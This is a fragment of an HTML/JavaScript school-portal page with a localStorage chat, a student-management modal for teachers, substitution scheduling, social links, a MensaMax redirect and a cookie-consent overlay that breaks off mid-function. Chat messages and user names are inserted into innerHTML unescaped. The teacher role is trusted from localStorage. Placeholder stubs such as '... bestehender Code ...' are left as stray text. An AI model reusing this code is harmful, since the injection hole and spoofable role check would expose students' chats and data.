                    headerActions.appendChild(chatButton);
                }
            }
            
            // Chat-Nachricht senden
            const chatSendButton = document.getElementById('chat-send-button');
            const chatMessageInput = document.getElementById('chat-message-input');
            
            if (chatSendButton && chatMessageInput) {
                chatSendButton.addEventListener('click', sendChatMessage);
                chatMessageInput.addEventListener('keypress', function(e) {
                    if (e.key === 'Enter') {
                        sendChatMessage();
                    }
                });
            }
            
            // Chat-Benutzer-Suche
            const userSearch = document.getElementById('user-search');
            if (userSearch) {
                userSearch.addEventListener('input', function() {
                    loadChatUsers(this.value);
                });
            }
            
            // Registrierte Benutzer in der Konsole ausgeben
            const registeredUsers = getRegisteredUsers();
            window.registeredUsers = registeredUsers;
            console.log("Beim Laden der Seite - Registrierte Benutzer:", registeredUsers);
            
            // Hinweis in der Konsole, wie man Beispielbenutzer importieren kann
            console.log("TIP: Verwende 'importExampleUsers()' in der Konsole, um Beispielbenutzer zu importieren.");
            console.log("TIP: Verwende 'clearAllUsers()' in der Konsole, um alle Benutzer zu löschen.");
        });
        
        // Globale Variablen für den aktuellen Chat
        let currentChatUser = null;
        
        // Funktion zum Laden der Chat-Benutzer
        function loadChatUsers(searchTerm = '') {
            const chatUsersList = document.getElementById('chat-users-list');
            if (!chatUsersList) return;
            
            // Chat-Benutzerliste leeren
            chatUsersList.innerHTML = '';
            
            // Alle registrierten Benutzer laden
            const registeredUsers = getRegisteredUsers();
            // Mache registeredUsers global verfügbar für Debugging
            window.registeredUsers = registeredUsers;
            console.log('Chat-Benutzer laden:', registeredUsers);
            
            const currentUser = JSON.parse(localStorage.getItem('zyroUser') || '{}');
            
            // Benutzer filtern (ohne den aktuellen Benutzer)
            const filteredUsers = registeredUsers.filter(user => {
                // Aktuellen Benutzer ausschließen
                if (user.username === currentUser.username) return false;
                
                // Nach Suchbegriff filtern, falls vorhanden
                if (searchTerm) {
                    const searchTermLower = searchTerm.toLowerCase();
                    return user.fullname?.toLowerCase().includes(searchTermLower) || 
                           user.username?.toLowerCase().includes(searchTermLower);
                }
                
                return true;
            });
            
            console.log('Gefilterte Chat-Benutzer:', filteredUsers);
            
            // Wenn keine Benutzer gefunden wurden, erstelle einen Testbenutzer
            if (filteredUsers.length === 0) {
                chatUsersList.innerHTML = '<div style="padding: 1rem; text-align: center; color: var(--gray-500);">Keine Benutzer gefunden</div>';
                chatUsersList.innerHTML += '<div style="padding: 1rem; text-align: center;"><button class="btn btn-secondary" onclick="importExampleUsers(); setTimeout(() => loadChatUsers(), 500);">Beispielbenutzer importieren</button></div>';
                return;
            }
            
            // Benutzer zur Liste hinzufügen
            filteredUsers.forEach(user => {
                const userItem = document.createElement('div');
                userItem.className = 'chat-user-item';
                userItem.style.padding = '0.75rem 1rem';
                userItem.style.borderBottom = '1px solid var(--gray-200)';
                userItem.style.cursor = 'pointer';
                
                // Ungelesene Nachrichten prüfen
                const chatMessagesKey = getChatMessagesKey(currentUser.username, user.username);
                const chatMessages = JSON.parse(localStorage.getItem(chatMessagesKey) || '[]');
                const unreadCount = chatMessages.filter(msg => 
                    msg.from === user.username && msg.read === false
                ).length;
                
                userItem.innerHTML = `
                    <div style="display: flex; align-items: center;">
                        <div style="width: 2.5rem; height: 2.5rem; border-radius: 50%; background-color: var(--primary-100); color: var(--primary-600); display: flex; align-items: center; justify-content: center; font-weight: 600; margin-right: 0.75rem;">
                            ${(user.fullname || user.username).charAt(0).toUpperCase()}
                        </div>
                        <div style="flex: 1;">
                            <div style="font-weight: 500;">${user.fullname || user.username}</div>
                            <div style="font-size: 0.75rem; color: var(--gray-500);">${user.school || ''}</div>
                        </div>
                        ${unreadCount > 0 ? `<div style="width: 1.5rem; height: 1.5rem; border-radius: 50%; background-color: var(--primary-500); color: white; display: flex; align-items: center; justify-content: center; font-size: 0.75rem;">${unreadCount}</div>` : ''}
                    </div>
                `;
                
                userItem.addEventListener('click', function() {
                    // Chat-Benutzer auswählen
                    document.querySelectorAll('.chat-user-item').forEach(item => {
                        item.style.backgroundColor = '';
                    });
                    this.style.backgroundColor = 'var(--primary-50)';
                    
                    // Ausgewählten Benutzer speichern
                    currentChatUser = user;
                    
                    // Chat-Nachrichten laden
                    loadChatMessages(user);
                    
                    // Chat-Eingabefeld anzeigen
                    document.getElementById('chat-input-area').style.display = 'block';
                });
                
                chatUsersList.appendChild(userItem);
            });
        }
        
        // Funktion zum Laden der Chat-Nachrichten
        function loadChatMessages(chatUser) {
            const chatMessages = document.getElementById('chat-messages');
            if (!chatMessages) return;
            
            // Chat-Nachrichten leeren
            chatMessages.innerHTML = '';
            
            // Aktuellen Benutzer laden
            const currentUser = JSON.parse(localStorage.getItem('zyroUser') || '{}');
            
            // Chat-Header hinzufügen
            const chatHeader = document.createElement('div');
            chatHeader.style.textAlign = 'center';
            chatHeader.style.padding = '0.5rem';
            chatHeader.style.marginBottom = '1rem';
            chatHeader.style.borderBottom = '1px solid var(--gray-200)';
            chatHeader.innerHTML = `<h3>Chat mit ${chatUser.fullname || chatUser.username}</h3>`;
            chatMessages.appendChild(chatHeader);
            
            // Chat-Nachrichten-Key generieren
            const chatMessagesKey = getChatMessagesKey(currentUser.username, chatUser.username);
            
            // Chat-Nachrichten laden
            let messages = JSON.parse(localStorage.getItem(chatMessagesKey) || '[]');
            
            if (messages.length === 0) {
                const emptyChat = document.createElement('div');
                emptyChat.style.textAlign = 'center';
                emptyChat.style.padding = '2rem';
                emptyChat.style.color = 'var(--gray-500)';
                emptyChat.innerHTML = `
                    <p>Noch keine Nachrichten. Schreibe etwas, um den Chat zu starten!</p>
                `;
                chatMessages.appendChild(emptyChat);
                return;
            }
            
            // Nachrichten als gelesen markieren
            messages = messages.map(msg => {
                if (msg.from === chatUser.username) {
                    return { ...msg, read: true };
                }
                return msg;
            });
            
            // Aktualisierte Nachrichten speichern
            localStorage.setItem(chatMessagesKey, JSON.stringify(messages));
            
            // Badge-Anzeige aktualisieren
            const userItem = document.querySelector(`.chat-user-item:nth-child(${Array.from(document.querySelectorAll('.chat-user-item')).findIndex(item => item.textContent.includes(chatUser.username)) + 1})`);
            if (userItem) {
                const badge = userItem.querySelector('div[style*="border-radius: 50%"]');
                if (badge) {
                    badge.remove();
                }
            }
            
            // Nachrichten anzeigen
            let lastDate = null;
            
            messages.forEach(message => {
                // Datum der Nachricht
                const messageDate = new Date(message.timestamp);
                const formattedDate = messageDate.toLocaleDateString('de-DE', { 
                    weekday: 'long', 
                    year: 'numeric', 
                    month: 'long', 
                    day: 'numeric' 
                });
                
                // Datumstrenner anzeigen, wenn es ein neuer Tag ist
                if (lastDate !== formattedDate) {
                    const dateDivider = document.createElement('div');
                    dateDivider.style.textAlign = 'center';
                    dateDivider.style.margin = '1rem 0';
                    dateDivider.style.position = 'relative';
                    dateDivider.innerHTML = `
                        <span style="background-color: var(--gray-50); padding: 0 0.5rem; position: relative; z-index: 1; color: var(--gray-500); font-size: 0.75rem;">
                            ${formattedDate}
                        </span>
                        <div style="position: absolute; top: 50%; left: 0; right: 0; height: 1px; background-color: var(--gray-200); transform: translateY(-50%); z-index: 0;"></div>
                    `;
                    chatMessages.appendChild(dateDivider);
                    lastDate = formattedDate;
                }
                
                // Nachricht erstellen
                const messageItem = document.createElement('div');
                messageItem.className = `chat-message ${message.from === currentUser.username ? 'sent' : 'received'}`;
                messageItem.style.maxWidth = '70%';
                messageItem.style.margin = '0.5rem 0';
                messageItem.style.padding = '0.75rem 1rem';
                messageItem.style.borderRadius = '0.5rem';
                messageItem.style.wordBreak = 'break-word';
                
                if (message.from === currentUser.username) {
                    // Eigene Nachricht (rechts)
                    messageItem.style.marginLeft = 'auto';
                    messageItem.style.backgroundColor = 'var(--primary-500)';
                    messageItem.style.color = 'white';
                    messageItem.style.borderBottomRightRadius = '0';
                } else {
                    // Fremde Nachricht (links)
                    messageItem.style.marginRight = 'auto';
                    messageItem.style.backgroundColor = 'white';
                    messageItem.style.border = '1px solid var(--gray-200)';
                    messageItem.style.borderBottomLeftRadius = '0';
                }
                
                // Uhrzeit formatieren
                const formattedTime = messageDate.toLocaleTimeString('de-DE', { hour: '2-digit', minute: '2-digit' });
                
                messageItem.innerHTML = `
                    <div>${message.text}</div>
                    <div style="font-size: 0.7rem; text-align: right; margin-top: 0.25rem; opacity: 0.8;">${formattedTime}</div>
                `;
                
                chatMessages.appendChild(messageItem);
            });
            
            // Zum Ende des Chats scrollen
            chatMessages.scrollTop = chatMessages.scrollHeight;
        }
        
        // Funktion zum Senden einer Chat-Nachricht
        function sendChatMessage() {
            if (!currentChatUser) return;
            
            const messageInput = document.getElementById('chat-message-input');
            const message = messageInput.value.trim();
            
            if (!message) return;
            
            // Aktuellen Benutzer laden
            const currentUser = JSON.parse(localStorage.getItem('zyroUser') || '{}');
            
            // Chat-Nachrichten-Key generieren
            const chatMessagesKey = getChatMessagesKey(currentUser.username, currentChatUser.username);
            
            // Bestehende Nachrichten laden
            const chatMessages = JSON.parse(localStorage.getItem(chatMessagesKey) || '[]');
            
            // Neue Nachricht erstellen
            const newMessage = {
                from: currentUser.username,
                to: currentChatUser.username,
                text: message,
                timestamp: new Date().toISOString(),
                read: false
            };
            
            // Nachricht zu bestehenden Nachrichten hinzufügen
            chatMessages.push(newMessage);
            
            // Aktualisierte Nachrichten speichern
            localStorage.setItem(chatMessagesKey, JSON.stringify(chatMessages));
            
            // Nachrichteneingabe leeren
            messageInput.value = '';
            
            // Sonderfall für den Testbenutzer: automatische Antwort generieren
            if (currentChatUser.username === "testuser") {
                // Chat-Nachrichten neu laden, um die eigene Nachricht anzuzeigen
                loadChatMessages(currentChatUser);
                
                // Nach kurzer Zeit eine Antwort vom Testbenutzer anzeigen
                setTimeout(() => {
                    const chatMessagesElement = document.getElementById('chat-messages');
                    if (!chatMessagesElement) return;
                    
                    // Automatische Antwort erstellen
                    const responseMessage = document.createElement('div');
                    responseMessage.className = 'chat-message received';
                    responseMessage.style.maxWidth = '70%';
                    responseMessage.style.margin = '0.5rem 0';
                    responseMessage.style.padding = '0.75rem 1rem';
                    responseMessage.style.borderRadius = '0.5rem';
                    responseMessage.style.wordBreak = 'break-word';
                    responseMessage.style.marginRight = 'auto';
                    responseMessage.style.backgroundColor = 'white';
                    responseMessage.style.border = '1px solid var(--gray-200)';
                    responseMessage.style.borderBottomLeftRadius = '0';
                    
                    const now = new Date();
                    const formattedTime = now.toLocaleTimeString('de-DE', { hour: '2-digit', minute: '2-digit' });
                    
                    // Verschiedene Antwortmöglichkeiten
                    const responses = [
                        "Danke für deine Nachricht! Das ist eine automatische Antwort.",
                        "Ich bin ein Demo-Benutzer und antworte automatisch auf deine Nachrichten.",
                        "Hallo! Schön, dass du das Chat-System testest!",
                        "Diese Antwort wurde automatisch generiert. Du kannst weiter mit mir chatten.",
                        "Das ist eine Testantwort. In einer echten Umgebung würden hier Antworten von realen Benutzern erscheinen."
                    ];
                    
                    // Zufällige Antwort auswählen
                    const randomResponse = responses[Math.floor(Math.random() * responses.length)];
                    
                    responseMessage.innerHTML = `
                        <div>${randomResponse}</div>
                        <div style="font-size: 0.7rem; text-align: right; margin-top: 0.25rem; opacity: 0.8;">${formattedTime}</div>
                    `;
                    
                    chatMessagesElement.appendChild(responseMessage);
                    
                    // Zum Ende des Chats scrollen
                    chatMessagesElement.scrollTop = chatMessagesElement.scrollHeight;
                }, 1000);
                
                return;
            }
            
            // Chat-Nachrichten neu laden
            loadChatMessages(currentChatUser);
            
            // Fokus auf Eingabefeld setzen
            messageInput.focus();
        }
        
        // Hilfsfunktion zum Generieren eines eindeutigen Chat-Nachrichten-Keys
        function getChatMessagesKey(user1, user2) {
            // Benutzernamen alphabetisch sortieren, um sicherzustellen, dass der Key immer gleich ist
            const sortedUsers = [user1, user2].sort();
            return `chat_messages_${sortedUsers[0]}_${sortedUsers[1]}`;
        }
    </script>

    <script>
        // ... existing code ...
</script>

<!-- Schüler-Management-Modal für Lehrer -->
<div class="modal" id="schueler-management-modal">
    <div class="modal-content" style="max-width: 400px;">
        <div class="modal-header">
            <h2 class="modal-title" id="schueler-modal-title">Schüler-Info</h2>
            <button class="modal-close" onclick="closeSchuelerModal()">&times;</button>
        </div>
        <div class="modal-body" id="schueler-modal-body">
            <!-- Profilbild, Name, Buttons, Infos werden per JS eingefügt -->
        </div>
    </div>
</div>
<script>
// ... bestehender Code ...
function openSchuelerModal(schueler) {
    const modal = document.getElementById('schueler-management-modal');
    const body = document.getElementById('schueler-modal-body');
    if (!modal || !body) return;
    // Profilbild und Name
    let html = `<div style='display:flex;flex-direction:column;align-items:center;'>
        <div style='width:80px;height:80px;border-radius:50%;background:#e0e7ff;display:flex;align-items:center;justify-content:center;font-size:2.5rem;font-weight:600;color:#6366f1;margin-bottom:1rem;'>${(schueler.fullname||schueler.username||'').charAt(0).toUpperCase()}</div>
        <div style='font-size:1.2rem;font-weight:600;margin-bottom:1.5rem;'>${schueler.fullname||schueler.username}</div>
    </div>`;
    // Buttons
    html += `<div style='display:flex;justify-content:space-around;margin-bottom:1.5rem;'>
        <button class='btn btn-danger' onclick='alert("Bann-Funktion kommt bald!")'>Bann</button>
        <button class='btn btn-danger' onclick='alert("Kick-Funktion kommt bald!")'>Kick</button>
        <button class='btn btn-secondary' onclick='alert("Ankündigung-Funktion kommt bald!")'>Ankündigung</button>
        <button class='btn btn-primary' id='schueler-infos-btn'>Infos</button>
    </div>`;
    // Platz für Info-Tab
    html += `<div id='schueler-infos-tab' style='display:none;'></div>`;
    body.innerHTML = html;
    // Infos-Button Event
    document.getElementById('schueler-infos-btn').onclick = function() {
        showSchuelerInfosTab(schueler);
    };
    modal.classList.add('open');
}
function closeSchuelerModal() {
    document.getElementById('schueler-management-modal').classList.remove('open');
}
function showSchuelerInfosTab(schueler) {
    const tab = document.getElementById('schueler-infos-tab');
    if (!tab) return;
    // Notizen laden
    const notizenKey = 'notizen_' + schueler.username;
    let notizen = localStorage.getItem(notizenKey) || '';
    // Login-Datum (Dummy, da nicht gespeichert, daher aktuelles Datum)
    const loginDatum = schueler.loginDate || new Date().toLocaleString('de-DE', { dateStyle: 'full', timeStyle: 'long' });
    // Anmeldedaten
    const anmeldedaten = schueler.contact || '';
    // IP (Dummy)
    const ip = '192.168.1.100';
    tab.style.display = 'block';
    tab.innerHTML = `
        <div style='margin-bottom:0.5rem;'><b>IP:</b> ${ip}</div>
        <div style='margin-bottom:0.5rem;'><b>ID:</b> ${schueler.username}</div>
        <div style='margin-bottom:0.5rem;'><b>Login-Datum:</b> ${loginDatum}</div>
        <div style='margin-bottom:0.5rem;'><b>Anmeldedaten:</b> ${anmeldedaten}</div>
        <div style='margin-bottom:0.5rem;'><b>Notizen der Lehrer:</b><br>
            <textarea id='schueler-notizen' style='width:100%;min-height:60px;'>${notizen}</textarea>
            <button class='btn btn-primary' style='margin-top:0.5rem;' onclick='saveSchuelerNotizen("${schueler.username}")'>Speichern</button>
        </div>
        <button class='btn btn-secondary' style='margin-top:1rem;' onclick='document.getElementById("schueler-infos-tab").style.display="none";'>Zurück</button>
    `;
}
function saveSchuelerNotizen(username) {
    const val = document.getElementById('schueler-notizen').value;
    localStorage.setItem('notizen_' + username, val);
    alert('Notiz gespeichert!');
}
// Chat: Wenn Lehrer auf Schüler klickt, Modal öffnen
function isCurrentUserTeacher() {
    const user = JSON.parse(localStorage.getItem('zyroUser') || '{}');
    return user.isTeacher === true;
}
document.addEventListener('DOMContentLoaded', function() {
    // ... bestehender Code ...
    // Chat-Benutzerliste: Klick auf Schüler öffnet Modal (nur für Lehrer)
    const chatUsersList = document.getElementById('chat-users-list');
    if (chatUsersList) {
        chatUsersList.addEventListener('click', function(e) {
            const userItem = e.target.closest('.chat-user-item');
            if (!userItem) return;
            if (!isCurrentUserTeacher()) return;
            // Schüler-Objekt finden
            const username = userItem.querySelector('div[style*="font-weight: 500;"]').textContent;
            const users = JSON.parse(localStorage.getItem('registeredUsers') || '[]');
            const schueler = users.find(u => (u.fullname || u.username) === username && !u.isTeacher);
            if (schueler) {
                openSchuelerModal(schueler);
            }
        });
    }
});
// ... bestehender Code ...
</script>
// ... bestehender Code ...

<!-- Vertretungs-Modal -->
<div class="modal" id="vertretung-modal">
    <div class="modal-content" style="max-width: 400px;">
        <div class="modal-header">
            <h2 class="modal-title">Vertretung eintragen</h2>
            <button class="modal-close" onclick="document.getElementById('vertretung-modal').classList.remove('open');">
                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <line x1="18" y1="6" x2="6" y2="18"></line>
                    <line x1="6" y1="6" x2="18" y2="18"></line>
                </svg>
            </button>
        </div>
        <div class="modal-body">
            <div id="vertretung-info"></div>
            <div class="form-group" style="margin-top: 1rem;">
                <label for="vertretungslehrer">Vertretungslehrer auswählen:</label>
                <select id="vertretungslehrer" style="width: 100%; margin-top: 0.5rem; padding: 0.5rem; border: 1px solid var(--gray-300); border-radius: 0.5rem;">
                    <!-- Lehrer werden per JavaScript eingefügt -->
                </select>
            </div>
        </div>
        <div class="modal-footer">
            <button class="btn btn-secondary" onclick="document.getElementById('vertretung-modal').classList.remove('open');">Abbrechen</button>
            <button class="btn btn-primary" onclick="vertretungSpeichern()">Speichern</button>
        </div>
    </div>
</div>

<script>
// Hilfsfunktion: Prüfe, ob aktueller User Lehrer ist
function isCurrentUserTeacher() {
    const user = JSON.parse(localStorage.getItem('zyroUser') || '{}');
    return user.isTeacher === true;
}

// Vertretungsdaten im localStorage verwalten
function getVertretungen() {
    return JSON.parse(localStorage.getItem('vertretungen') || '{}');
}

function setVertretungen(vertretungen) {
    localStorage.setItem('vertretungen', JSON.stringify(vertretungen));
}

// Aktuelle Vertretungsinformationen
let aktuelleVertretung = {
    tag: '',
    zeit: '',
    fach: '',
    lehrer: ''
};

// Event-Listener für Stundenplan-Slots
document.addEventListener('DOMContentLoaded', function() {
    if (isCurrentUserTeacher()) {
        // Für Lehrer: Klickbare Slots
        document.querySelectorAll('.time-slot').forEach(slot => {
            slot.style.cursor = 'pointer';
            slot.onclick = function() {
                const tag = slot.closest('.time-column').querySelector('.time-header').textContent;
                const zeit = slot.querySelector('.time-slot-time').textContent;
                const fach = slot.querySelector('.time-slot-subject').textContent;
                vertretungModal(tag, zeit, fach);
            };
        });
    }
    
    // Vertretungen anzeigen
    zeigeVertretungen();
});

// Modal für Vertretungsauswahl öffnen
function vertretungModal(tag, zeit, fach) {
    // Aktuelle Vertretung speichern
    aktuelleVertretung = { tag, zeit, fach };
    
    // Modal-Info setzen
    document.getElementById('vertretung-info').innerHTML = `
        <p><strong>${tag}, ${zeit}</strong></p>
        <p>Fach: ${fach}</p>
    `;
    
    // Lehrer-Liste laden
    const select = document.getElementById('vertretungslehrer');
    select.innerHTML = '<option value="">Bitte wählen...</option>';
    
    // Registrierte Lehrer laden
    const users = JSON.parse(localStorage.getItem('registeredUsers') || '[]');
    users.filter(user => user.isTeacher).forEach(lehrer => {
        const option = document.createElement('option');
        option.value = lehrer.fullname || lehrer.username;
        option.textContent = lehrer.fullname || lehrer.username;
        select.appendChild(option);
    });
    
    // Aktuelle Vertretung vorauswählen, falls vorhanden
    const vertretungen = getVertretungen();
    if (vertretungen[tag] && vertretungen[tag][zeit]) {
        select.value = vertretungen[tag][zeit];
    }
    
    // Modal öffnen
    document.getElementById('vertretung-modal').classList.add('open');
}

// Vertretung speichern
function vertretungSpeichern() {
    const lehrerSelect = document.getElementById('vertretungslehrer');
    const vertretungslehrer = lehrerSelect.value;
    
    if (!vertretungslehrer) {
        alert('Bitte wähle einen Vertretungslehrer aus!');
        return;
    }
    
    // Vertretung speichern
    const vertretungen = getVertretungen();
    if (!vertretungen[aktuelleVertretung.tag]) {
        vertretungen[aktuelleVertretung.tag] = {};
    }
    vertretungen[aktuelleVertretung.tag][aktuelleVertretung.zeit] = vertretungslehrer;
    setVertretungen(vertretungen);
    
    // Modal schließen
    document.getElementById('vertretung-modal').classList.remove('open');
    
    // Vertretungen neu anzeigen
    zeigeVertretungen();
}

// Vertretungen im Stundenplan anzeigen
function zeigeVertretungen() {
    const vertretungen = getVertretungen();
    
    document.querySelectorAll('.time-slot').forEach(slot => {
        const tag = slot.closest('.time-column').querySelector('.time-header').textContent;
        const zeit = slot.querySelector('.time-slot-time').textContent;
        
        // Alte Vertretungsinfo entfernen
        const oldInfo = slot.querySelector('.vertretung-info');
        if (oldInfo) oldInfo.remove();
        
        // Neue Vertretungsinfo anzeigen, falls vorhanden
        if (vertretungen[tag] && vertretungen[tag][zeit]) {
            const vertretungsInfo = document.createElement('div');
            vertretungsInfo.className = 'vertretung-info';
            vertretungsInfo.style.color = '#ef4444';
            vertretungsInfo.style.fontWeight = 'bold';
            vertretungsInfo.style.marginTop = '0.5rem';
            vertretungsInfo.textContent = 'Vertretung: ' + vertretungen[tag][zeit];
            slot.appendChild(vertretungsInfo);
        }
    });
}
</script>
// ... bestehender Code ...

<!-- Social Media Seite -->
<div class="page-container" id="social-media-page">
    <div class="grid" style="grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1.5rem; padding: 1.5rem;">
        <!-- TikTok Card -->
        <div class="social-card" onclick="window.open('https://www.tiktok.com/@mathildeanneke', '_blank')">
            <div class="social-card-content">
                <svg class="social-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512">
                    <path fill="currentColor" d="M448,209.91a210.06,210.06,0,0,1-122.77-39.25V349.38A162.55,162.55,0,1,1,185,188.31V278.2a74.62,74.62,0,1,0,52.23,71.18V0l88,0a121.18,121.18,0,0,0,1.86,22.17h0A122.18,122.18,0,0,0,381,102.39a121.43,121.43,0,0,0,67,20.14Z"/>
                </svg>
                <h2 class="social-title">TikTok</h2>
                <p class="social-description">Folge uns auf TikTok</p>
                <div class="social-username">@mathildeanneke</div>
            </div>
        </div>

        <!-- Instagram Card -->
        <div class="social-card" onclick="window.open('https://www.instagram.com/mathildeanneke/', '_blank')">
            <div class="social-card-content">
                <svg class="social-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                    <path fill="currentColor" d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
                </svg>
                <h2 class="social-title">Instagram</h2>
                <p class="social-description">Folge uns auf Instagram</p>
                <div class="social-username">@mathildeanneke</div>
            </div>
        </div>

        <!-- Schulwebsite Card -->
        <div class="social-card" onclick="window.open('https://www.mathilde-anneke-schule.de/', '_blank')">
            <div class="social-card-content">
                <svg class="social-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                    <path fill="currentColor" d="M12 3L1 9l4 2.18v6L12 21l7-3.82v-6l2-1.09V17h2V9L12 3zm6.82 6L12 12.72 5.18 9 12 5.28 18.82 9zM17 15.99l-5 2.73-5-2.73v-3.72L12 15l5-2.73v3.72z"/>
                </svg>
                <h2 class="social-title">Schulwebsite</h2>
                <p class="social-description">Besuche unsere Website</p>
                <div class="social-username">mathilde-anneke-schule.de</div>
            </div>
        </div>
    </div>
</div>

<script>
document.addEventListener('DOMContentLoaded', function() {
    fetch('http://localhost:3000/track-visit', { method: 'POST' })
        .catch(function(err) {
            console.log('Tracking nicht verfügbar');
        });
});
</script>

<script>
function showSocialMediaPage(event) {
    // Alle Seiten ausblenden
    const pages = ['dashboard-content', 'stundenplan-page', 'noten-page', 'nachrichten-page', 'social-media-page'];
    pages.forEach(function(pageId) {
        const page = document.getElementById(pageId);
        if (page) {
            page.classList.remove('active');
        }
    });
    
    // Social Media Seite anzeigen
    const socialMediaPage = document.getElementById('social-media-page');
    if (socialMediaPage) {
        socialMediaPage.classList.add('active');
    }
    
    // Aktiven Link setzen
    document.querySelectorAll('.nav-link').forEach(function(link) {
        link.classList.remove('active');
    });
    if (event && event.currentTarget) {
        event.currentTarget.classList.add('active');
    }
    
    // Seitentitel aktualisieren
    const pageTitle = document.getElementById('current-page-title');
    if (pageTitle) {
        pageTitle.textContent = 'Social Media';
    }
    
    // Auf mobilen Geräten das Menü schließen
    if (window.innerWidth < 768) {
        const navigation = document.getElementById('navigation');
        if (navigation) {
            navigation.classList.remove('open');
        }
    }
}
// ... bestehender Code ...
</script>
// ... bestehender Code ...

<!-- Mensa Seite -->
<div class="page-container" id="mensa-page">
    <div class="card" style="text-align: center; padding: 2rem;">
        <h2 style="margin-bottom: 1.5rem;">MensaMax Anmeldung</h2>
        <p style="font-size: 1.2rem; margin-bottom: 1rem;">Bitte melden Sie sich bei MensaMax an, um die Speisepläne einzusehen und Ihr Guthaben zu verwalten.</p>
        <p style="color: var(--gray-500); margin-bottom: 2rem;">Sie werden in wenigen Sekunden automatisch weitergeleitet...</p>
        <div class="loading-spinner" style="margin: 0 auto; width: 40px; height: 40px; border: 3px solid var(--gray-200); border-top-color: var(--primary-600); border-radius: 50%; animation: spin 1s linear infinite;"></div>
    </div>
</div>

<style>
@keyframes spin {
    to { transform: rotate(360deg); }
}
</style>

<script>
// Funktion zum Anzeigen der Mensa-Seite
function showMensaPage(event) {
    console.log('showMensaPage aufgerufen'); // Debug-Log
    
    // Alle Seiten ausblenden
    const pages = [
        'dashboard-content',
        'stundenplan-page',
        'noten-page',
        'nachrichten-page',
        'social-media-page'
    ];
    
    pages.forEach(function(pageId) {
        const element = document.getElementById(pageId);
        if (element) {
            element.classList.remove('active');
        }
    });
    
    // Mensa-Seite anzeigen
    const mensaPage = document.getElementById('mensa-page');
    if (mensaPage) {
        console.log('Mensa-Seite gefunden, aktiviere sie'); // Debug-Log
        mensaPage.classList.add('active');
        
        // Nach 5 Sekunden zu MensaMax weiterleiten
        console.log('Starte 5-Sekunden-Timer'); // Debug-Log
        setTimeout(function() {
            console.log('Timer abgelaufen, leite weiter'); // Debug-Log
            window.location.href = 'https://m.mensamax.de/';
        }, 5000);
    } else {
        console.log('Mensa-Seite nicht gefunden!'); // Debug-Log
    }
    
    // Aktiven Link setzen
    document.querySelectorAll('.nav-link').forEach(function(link) {
        link.classList.remove('active');
    });
    if (event && event.currentTarget) {
        event.currentTarget.classList.add('active');
    }
    
    // Seitentitel aktualisieren
    const pageTitle = document.getElementById('current-page-title');
    if (pageTitle) {
        pageTitle.textContent = 'Mensa';
    }
    
    // Auf mobilen Geräten das Menü schließen
    if (window.innerWidth < 768) {
        const navigation = document.getElementById('navigation');
        if (navigation) {
            navigation.classList.remove('open');
        }
    }
}

// Tracking-Script korrekt einbinden
document.addEventListener('DOMContentLoaded', function() {
    fetch('http://localhost:3000/track-visit', { method: 'POST' })
        .catch(function(err) {
            console.log('Tracking nicht verfügbar');
        });
});
</script>

<!-- Cookie Notice Styles -->
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
    }

    .cookie-overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background-color: rgba(0, 0, 0, 0.75);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 9999;
    }

    .cookie-box {
      background-color: white;
      padding: 2rem;
      border-radius: 10px;
      max-width: 420px;
      text-align: center;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
    }

    .cookie-box p {
      margin-bottom: 1.5rem;
    }

    .cookie-box button {
      padding: 0.6rem 1.2rem;
      margin: 0.5rem;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-weight: bold;
      font-size: 14px;
    }

    .accept-btn {
      background-color: #4CAF50;
      color: white;
    }

    .decline-btn {
      background-color: #f44336;
      color: white;
    }
  </style>
</head>
<body>
    
  <!-- Cookie-Hinweis -->
  <div class="cookie-overlay" id="cookieNotice">
    <div class="cookie-box">
 <p>
  Um dir das bestmögliche Nutzererlebnis zu bieten und unsere Inhalte zu optimieren, 
  nutzen wir bestimmte technische Informationen über dein Gerät, deine Verbindung 
  und deine Umgebung. Bist du damit einverstanden?
</p>
      <button class="accept-btn" onclick="acceptConsent()">Ich stimme zu</button>
      <button class="decline-btn" onclick="declineConsent()">Ich stimme nicht zu</button>
    </div>
  </div>

  <script>
    // Beim Laden immer Abfrage zeigen (keine Speicherung prüfen)
    window.onload = function() {
      document.getElementById("cookieNotice").style.display = "flex";
      document.body.style.overflow = "hidden"; // Seite blockieren
    };

    function getDeviceType() {
      const ua = navigator.userAgent;
      if (/Tablet|iPad/i.test(ua)) return "📲 Tablet";
      if (/Mobi|Android/i.test(ua)) return "📱 Mobil";
      return "💻 Desktop";
